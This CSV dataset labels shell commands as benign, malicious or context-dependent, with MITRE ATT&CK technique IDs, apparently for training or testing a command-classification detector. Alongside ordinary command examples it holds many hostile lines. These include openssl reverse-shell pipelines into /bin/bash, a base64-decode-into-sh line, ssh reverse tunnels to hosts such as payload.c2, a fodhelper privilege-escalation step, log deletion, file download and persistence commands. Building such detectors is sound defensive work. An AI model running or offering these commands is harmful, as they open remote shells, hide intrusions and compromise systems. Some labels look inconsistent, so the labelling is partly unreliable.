command,label,original_label,mitre_id
"find ./work/ -type f -name ""*.pdf"" -mtime +5 -size +2M | xargs -r cp -t ./backup/",Benign,Benign,Benign
"find . -name ""*$VERSION*""",Benign,Benign,Benign
rdp_check.py domain/username@target,Benign,Benign,Benign
travis version,Benign,Benign,Benign
npm help-search keyword1 keyword2 ...,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9001,Malicious,Synthetic,Synthetic
iconv [-l|--list],Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:3389,Malicious,Synthetic,Synthetic
wmiexec,Malicious,Malicious,T1047
"echo -e ""HTTP/1.1 200 OK\n\n $(date)""",Benign,Benign,Benign
grub-mkrescue --directory /usr/lib/grub/i386-pc --output grub.iso path/to/source,Benign,Benign,Benign
skills [ls|list],Benign,Benign,Benign
find /var/www/* -type d -print | tar -zcpvf {}.tar.gz -C /var/www/ --files-from - {} \;,Benign,Benign,Benign
expose serve hostname,Benign,Benign,Benign
echo $dash_encoded | b64decode -r | sh,Malicious,Malicious,T1140
log stream,Benign,Benign,Benign
ssh -R 4444:localhost:22 admin@10.10.10.25,Context_Dependent,Synthetic,Synthetic
echo -n `hostname`,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:110 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
makensis path/to/file.nsi,Benign,Benign,Benign
"ugrep [-t |--file-type=]cpp ""search_pattern""",Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:22 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
vso sys-upgrade check,Benign,Benign,Benign
jmap -heap filename.jar java_pid,Benign,Benign,Benign
wp plugin install plugin --activate,Benign,Benign,Benign
dirs,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:53,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:993,Malicious,Synthetic,Synthetic
"git ls-files | grep -vE ""(png|jpg|ico)"" | xargs wc -l",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:53,Malicious,Synthetic,Synthetic
"find . -name '*.doc' -exec rm ""{}"" \;",Benign,Benign,Benign
"arduino --install-boards ""arduino:sam""",Benign,Benign,Benign
"find /usr/ -path ""*local*""",Benign,Benign,Benign
comm -1 -2 <(sort file1) <(sort file2),Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:6379 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
zeroclaw gateway --host 0.0.0.0 [-p|--port] 8080,Benign,Benign,Benign
zrok share public http://localhost:8080,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:3306 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
tlmgr option setting,Benign,Benign,Benign
hyprshot [-m|--mode] active [-m|--mode] window,Benign,Benign,Benign
HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows,Malicious,Malicious,T1060
openssl s_client -quiet -connect 192.168.0.50:993 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
find / -name composer.json,Context_Dependent,Benign,Benign
locust [-H|--host] http://example.com,Benign,Benign,Benign
tshark -c 5 -i $interface,Context_Dependent,Malicious,T1040
dutree --aggr numberK,Benign,Benign,Benign
lsattr -d,Benign,Benign,Benign
Install-Module module -RequiredVersion version,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9001,Malicious,Synthetic,Synthetic
mv /path/to/temp-file /path/to/output-file,Malicious,Malicious,T1222
rip [-u|--unbury],Benign,Benign,Benign
jhsdb jstack --pid pid,Benign,Benign,Benign
ssh -R 8080:localhost:22 audit@172.20.10.8,Context_Dependent,Synthetic,Synthetic
ssh -L 8080:localhost:9001 support@files.company.local,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4444,Malicious,Synthetic,Synthetic
od -xcb testscript.sh,Benign,Benign,Benign
pixi task list,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9001,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.25:995 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
ssh -L 8080:localhost:80 root@malware.site,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.5:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:22,Malicious,Synthetic,Synthetic
fiascotopnm [-z|--fast] path/to/file.fiasco [-o|--output] output_file_basename,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:993,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.10:9090 | /bin/bash | openssl s_client -quiet -connect 10.0.0.10:9002,Malicious,Synthetic,Synthetic
Connect-AzureAD -Credential $Credential 2>&1> $null,Malicious,Malicious,T1110
ssh -R 4444:localhost:22 audit@internal.corp,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.20.30.40:993 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.5.20:1433 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
path/to/cs2 -dedicated +map de_dust2 -maxplayers 64,Benign,Benign,Benign
picom [-b|--daemon],Benign,Benign,Benign
ssh -L 8080:localhost:9090 operator@10.0.0.1,Context_Dependent,Synthetic,Synthetic
mitmproxy [-m|--mode] regular|transparent|socks5|...,Benign,Benign,Benign
sonar-scanner [-D|--define] project.settings=myproject.properties,Benign,Benign,Benign
find . -ctime 1 -type f,Benign,Benign,Benign
paste -sd+ infile | bc,Benign,Benign,Benign
"cd ""$(dirname ""$(which oracle)"")""",Benign,Benign,Benign
"Start-Process ""C:\Windows\System32\fodhelper.exe""",Malicious,Malicious,T1548
dnswalk -i domain.,Benign,Benign,Benign
ssh -L 8080:localhost:53 user@10.0.0.10,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.5.20:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:445,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:993 admin@10.0.0.100,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.10:9090 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:443 postgres@192.168.1.254,Context_Dependent,Synthetic,Synthetic
biff tag lines /tmp/access.log | biff time in system | biff time fmt [-f|--format] '%c' | head [-n|--lines] 3 | biff untag [-s|--substitute],Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:53,Malicious,Synthetic,Synthetic
"find ./ -name ""foo.mp4"" -printf ""%h\n""",Benign,Benign,Benign
"BlobName = """"",Context_Dependent,Malicious,T1619
tldr pacman files,Benign,Benign,Benign
"dir=$(dirname -- ""$1"")",Benign,Benign,Benign
dcgmi discovery [-l|--list],Benign,Benign,Benign
poetry shell,Benign,Benign,Benign
aws route53 list-resource-record-sets --hosted-zone-id zone_id,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8888,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:80,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:143 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
docker run --name t1069_container --rm -d -t t1069,Context_Dependent,Malicious,T1069
openssl s_client -quiet -connect 172.16.0.10:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:1433,Malicious,Synthetic,Synthetic
bcdboot C:\Windows /s S: /f UEFI|BIOS|ALL,Benign,Benign,Benign
mkinitfs -C gzip|xz|zstd|lz4|none,Benign,Benign,Benign
sbt -h,Benign,Benign,Benign
handlr get .png,Benign,Benign,Benign
sudo blockdev --setro /dev/sdXY,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:9090 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
resolveip [-s|--silent] example.org,Benign,Benign,Benign
po4a-updatepo --help-format,Benign,Benign,Benign
systemd-repart --dry-run yes,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:993,Malicious,Synthetic,Synthetic
bgpgrep master4.mrt -communities \( '64497:*' \),Benign,Benign,Benign
ssh -L 8080:localhost:993 user@192.168.1.254,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.5:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.50:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8443,Malicious,Synthetic,Synthetic
clang++ path/to/source.cpp -Wall [-g|--debug] -Og [-o|--output] path/to/output_executable,Benign,Benign,Benign
"skate delete ""key""@""database_name""",Benign,Benign,Benign
kinit -r 1w,Benign,Benign,Benign
hashcat [-m|--hash-type] hash_type_id [-a|--attack-mode] 3 hash_value,Benign,Benign,Benign
find . -maxdepth 1 -type f | xargs -I ‘{}’ sudo mv {} /directory1/directory2,Benign,Benign,Benign
"security set-identity-preference -s URL|hostname|service -c ""common_name"" path/to/file.keychain",Benign,Benign,Benign
ssh -R 4444:localhost:22 support@malware.site,Context_Dependent,Synthetic,Synthetic
ssh -R 4444:localhost:4444 jenkins@ops-audit.internal,Context_Dependent,Synthetic,Synthetic
svn status | grep '\!' | cut -d\ -f2-,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:9090 | /bin/bash | openssl s_client -quiet -connect 10.0.0.10:8081,Malicious,Synthetic,Synthetic
crunch 3 5 -o START -b 10kb -s abc,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:5432,Malicious,Synthetic,Synthetic
calligrastage path/to/presentation,Benign,Benign,Benign
git gc,Benign,Benign,Benign
New-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\Filesystems\NTFS -Name SymlinkRemoteToLocalEvaluation -PropertyType DWORD -Value 1 -Force -ErrorAction Ignore,Malicious,Malicious,T1222
find . -name *conf*,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:3389 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
sudo lvresize [-l|--extents] 100%FREE volume_group/logical_volume,Benign,Benign,Benign
paste --delimiter=\\n --serial *.txt,Benign,Benign,Benign
adduser username,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:80,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.20.30.40:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4444,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:80 operator@support.internal,Context_Dependent,Synthetic,Synthetic
yard,Benign,Benign,Benign
find build -not \( -path build/external -prune \) -name \*.js,Benign,Benign,Benign
velero restore create --from-schedule schedule_name,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:110,Malicious,Synthetic,Synthetic
elasticsearch-reset-password [-u|--username] user,Benign,Benign,Benign
ssh -R 8080:localhost:8080 operator@10.20.30.40,Context_Dependent,Synthetic,Synthetic
ssh -L 8080:localhost:80 backup@10.0.0.50,Context_Dependent,Synthetic,Synthetic
nagios /etc/nagios/nagios.cfg,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:6379 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
"osascript -e 'say ""Hello""' -e 'say ""world""'",Benign,Benign,Benign
apptainer build path/to/image.sif path/to/definition.def,Benign,Benign,Benign
version.dll,Malicious,Malicious,T1574
openssl s_client -quiet -connect 10.10.10.25:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
csvsort [-r|--reverse] [-c|--columns] name data.csv,Benign,Benign,Benign
ssh -R 8080:localhost:80 deploy@172.16.5.20,Context_Dependent,Synthetic,Synthetic
split -l9 your_file,Benign,Benign,Benign
certutil -decodehex {PATH:.hex} {PATH},Malicious,Malicious,T1140
"echo {1..3} {a..c}{dir1,dir2,dir3}",Benign,Benign,Benign
chatgpt [-m|--model] gpt-4,Benign,Benign,Benign
betty download https://example.com/file.ext to path/to/output_file.ext,Benign,Benign,Benign
zapier push [-d|--debug],Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
comm -23 <(command_which_generate_N|sort) <(command_which_generate_M|sort),Benign,Benign,Benign
urpmf --description keyword1 -o keyword2,Benign,Benign,Benign
echo '...' >Vagrantfile,Malicious,Malicious,T1548
openssl s_client -quiet -connect 172.16.5.20:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8888,Malicious,Synthetic,Synthetic
openrgb [-h|--help],Benign,Benign,Benign
tldr run-mailcap,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:110,Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:22 svcuser@10.10.10.10,Context_Dependent,Synthetic,Synthetic
find / -nogroup staff -print,Context_Dependent,Benign,Benign
"powershell -Command ""Get-WmiObject -class Win32_NetworkAdapter | ForEach { If ($.NetEnabled) { $.Disable() } }"" > NUL",Malicious,Malicious,T1489
xwinwrap -g 1600x900+1920 -b -nf -ov -- mpv --wid wid --loop --no-audio --no-resume-playback --panscan=1.0 path/to/video.mkv,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:6379 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
gradle build --offline,Benign,Benign,Benign
runlim --time-limit=number command command_arguments,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:5432,Malicious,Synthetic,Synthetic
pipenv lock --requirements,Benign,Benign,Benign
ssh -L 8080:localhost:80 support@internal.corp,Context_Dependent,Synthetic,Synthetic
ssh -R 4444:localhost:8080 deploy@target.com,Context_Dependent,Synthetic,Synthetic
ssh -R 4444:localhost:1433 audit@10.0.0.5,Context_Dependent,Synthetic,Synthetic
sudo alien [-t|--to-tgz] path/to/file,Benign,Benign,Benign
ssh -L 8080:localhost:9090 user@192.168.1.25,Context_Dependent,Synthetic,Synthetic
"find / -iname ""filename""",Context_Dependent,Benign,Benign
ssh -L 8080:localhost:80 root@cdn-sync.bad,Context_Dependent,Synthetic,Synthetic
pnmrotate angle path/to/input.pnm > path/to/output.pnm,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:445 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:22 svcuser@ops-audit.internal,Context_Dependent,Synthetic,Synthetic
sudo fsck /dev/sdXN,Benign,Benign,Benign
csplit [-k|--keep-files] path/to/file 5 {*},Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:995 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
du -ks * | sort -n -r,Benign,Benign,Benign
cage -- application arguments,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:445 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:3389 audit@172.16.5.20,Context_Dependent,Synthetic,Synthetic
iperf [-c|--client] server_address,Benign,Benign,Benign
npm unstar package_name --loglevel silent|error|warn|notice|http|timing|info|verbose|silly,Benign,Benign,Benign
tifftopnm [-a|-alphaout] path/to/alpha_file.pgm path/to/input_file.tiff > path/to/output_file.pnm,Benign,Benign,Benign
pbmpage -a4 > path/to/file.pbm,Benign,Benign,Benign
dnf [grp|group] install group_name,Benign,Benign,Benign
k6 run [-o|--out] influxdb=http://localhost:8086/k6db script.js,Benign,Benign,Benign
joe path/to/file,Benign,Benign,Benign
nyxt --system-information,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:53 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
[ -e path/to/file_or_directory ],Benign,Benign,Benign
"Copy-Item ""$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs"" ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs""",Malicious,Malicious,T1547
AutoUpdater.js,Malicious,Malicious,T1036
couchdb,Benign,Benign,Benign
ssh -L 8080:localhost:80 support@files.company.local,Context_Dependent,Synthetic,Synthetic
ssh -L 8080:localhost:8888 root@10.10.10.10,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.25:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:1433,Malicious,Synthetic,Synthetic
VBoxManage list hdds,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8080,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.20.30.40:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
C:\Windows\System32\cmd.exe /c net view /all,Context_Dependent,Malicious,T1135
ssh -R 8080:localhost:8888 operator@10.20.30.40,Context_Dependent,Synthetic,Synthetic
cpan -i module_name,Benign,Benign,Benign
apptainer verify [-j|--json] path/to/image.sif,Benign,Benign,Benign
cot --wait path/to/file,Benign,Benign,Benign
serialver -Joption classnames,Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:995,Malicious,Synthetic,Synthetic
arping -f host_ip,Benign,Benign,Benign
ssh -L 8080:localhost:80 support@target.com,Context_Dependent,Synthetic,Synthetic
snowsql --config path/to/configuration_file,Benign,Benign,Benign
eget zyedidia/micro [-d|--download-only],Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8443,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:80 deploy@10.0.0.8,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:110 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
autoload -Uz add-zsh-hook,Benign,Benign,Benign
act push [-W|--workflows] path/to/workflow,Benign,Benign,Benign
public class Test {,Malicious,Malicious,T1036
scrot [-c|--count] [-d|--delay] 10,Benign,Benign,Benign
mkfs.erofs -U UUID image.erofs root/,Benign,Benign,Benign
clang-tidy -checks=* -list-checks,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:110,Malicious,Synthetic,Synthetic
git gui citool --nocommit,Benign,Benign,Benign
pstopnm path/to/file.ps,Benign,Benign,Benign
check-language-support,Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:3389,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.25:80 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
gvmap graph.gv -o output.xdot,Benign,Benign,Benign
transmission-edit [-a|--add] http://example.com path/to/file.torrent,Benign,Benign,Benign
mypy /path/to/input-file --junit-xml /path/to/output-file,Malicious,Malicious,T1222
openssl s_client -quiet -connect 172.20.10.8:995 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
sg run --pattern 'Some($A)' --rewrite 'None' --json | jq '.[].replacement' | jless,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:8888 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
zsync -q path/to/url.zsync,Benign,Benign,Benign
"notify-send [-t|--expire-time] 5000 ""Test"" ""This is a test""",Benign,Benign,Benign
lldb -p pid,Benign,Benign,Benign
meson [-h|--help],Benign,Benign,Benign
crane push path/to/tarball image_name --image-refs path/to/file,Benign,Benign,Benign
if [ -d /var/audit ] ; then sudo rm -rf $macos_audit_path ; fi,Malicious,Malicious,T1070
xzdiff --paginate path/to/file1 path/to/file2,Benign,Benign,Benign
qlmanage *.jpg -t -s 300 path/to/directory,Benign,Benign,Benign
buzzphrase '{{{i} {v} {a} {N}}}',Benign,Benign,Benign
ps aux | tr -s '[:blank:]' | cut -d' ' -f3,Context_Dependent,Benign,Benign
ssh -R 4444:localhost:8888 backup@corp-backup.internal,Context_Dependent,Synthetic,Synthetic
pamcut [-t|-top] value [-b|-bottom] value -pad path/to/image.ppm > path/to/output.ppm,Benign,Benign,Benign
"ipscan 192.168.0.1-254 -p 80,443,22",Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:445,Malicious,Synthetic,Synthetic
bundle exec middleman build,Benign,Benign,Benign
ember new my_new_app,Benign,Benign,Benign
"mount /mnt/mountpoint -oremount,rw",Context_Dependent,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:3389,Malicious,Synthetic,Synthetic
kubectl certificate deny csr_name,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:995,Malicious,Synthetic,Synthetic
ssh -L 8080:localhost:80 postgres@172.16.0.25,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.25:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:3389,Malicious,Synthetic,Synthetic
avo checkout branch_name,Benign,Benign,Benign
"find /public/html/cosi -name ""wiki.phtml -exec echo ""<a href=\""{}\"">{}</a>"" \;",Benign,Benign,Benign
k3s kubectl get nodes,Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:53 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.5.20:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:110,Malicious,Synthetic,Synthetic
Remove-Item $teamviewer_log_file -Force -ErrorAction Ignore,Malicious,Malicious,T1070
openssl s_client -quiet -connect 10.10.10.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.0.5:8080,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:993,Malicious,Synthetic,Synthetic
Get-ChildItem -Path C:\Users\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force,Context_Dependent,Malicious,T1217
ssh -R 4444:localhost:22 support@payload.c2,Context_Dependent,Synthetic,Synthetic
cat /dev/urandom | tr -dc '. ' | fold -w 100,Benign,Benign,Benign
adb install -g path/to/file.apk,Benign,Benign,Benign
gfortran path/to/source.f90 -o path/to/output_executable -Ipath/to/mod_and_include -Lpath/to/library -llibrary_name,Benign,Benign,Benign
C:\Windows\System32\winevt\Logs,Malicious,Malicious,T1070
ssh -R 8080:localhost:110 jenkins@ops-audit.internal,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.25:3389 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:6379,Malicious,Synthetic,Synthetic
difft path/to/file_or_directory1 path/to/file_or_directory2,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:143 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
"su -s /bin/bash -c 'bash --rcfile <(echo ""source ~/.bashrc; source myfile"")'",Benign,Benign,Benign
find src/ | entr -s 'make | sed 10q',Benign,Benign,Benign
doas -C path/to/config_file command,Benign,Benign,Benign
glances [-s|--server],Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:5432,Malicious,Synthetic,Synthetic
firefox --safe-mode,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:22 svcuser@10.10.10.50,Context_Dependent,Synthetic,Synthetic
"cd $(find . -maxdepth 1 -type d -name ""folder_*"" | sort -t_ -k2 -n -r | head -1)",Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:80,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:53,Malicious,Synthetic,Synthetic
$User.PasswordNotRequired = $False,Malicious,Malicious,T1136
mount -t linprocfs none /proc,Context_Dependent,Benign,Benign
ssh -L 8080:localhost:80 postgres@172.16.0.10,Context_Dependent,Synthetic,Synthetic
tracepath -m max_hops host,Context_Dependent,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8888,Malicious,Synthetic,Synthetic
vgrep search_pattern,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:6379,Malicious,Synthetic,Synthetic
MpCmdRun.exe -DownloadFile -url $remote_file -path $local_path,Malicious,Malicious,T1105
pbmtogem path/to/file.pbm > path/to/file.img,Benign,Benign,Benign
ssh -R 8080:localhost:445 user@192.168.1.10,Context_Dependent,Synthetic,Synthetic
lrzip [-b|--bzip2] path/to/file,Benign,Benign,Benign
rsync -rvz --progress --remove-sent-files ./dir user@host:/path,Benign,Benign,Benign
npm-home [-y|--yarn] package,Benign,Benign,Benign
"{cmd /c copy ""$binary_file"" ""\\$machine\$remote_drive_letter$$exe_remote_folder""",Malicious,Malicious,T1105
apptainer sign [-i|--sif-id] object_id path/to/image.sif,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:5432,Malicious,Synthetic,Synthetic
